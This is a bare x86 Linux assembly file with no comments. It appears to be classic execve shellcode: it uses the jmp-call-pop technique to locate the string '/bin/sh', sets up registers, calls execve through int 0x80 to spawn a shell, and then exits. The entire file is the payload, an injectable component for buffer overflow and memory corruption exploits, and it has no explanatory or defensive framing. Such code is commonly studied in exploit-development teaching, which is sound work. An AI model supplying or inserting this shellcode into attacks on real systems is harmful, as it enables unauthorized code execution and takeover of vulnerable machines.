section .text
    global _start

_start:
    jmp callback

callshell:
    pop esi
    xor eax, eax
    push eax
    push esi

    xor edx, edx

    mov al, 0xb
    mov ebx, esi
    mov ecx, esp
    int 0x80

    xor eax, eax
    mov al, 1
    xor ebx, ebx
    int 0x80

callback:
    call callshell
    db "/bin/sh", 0
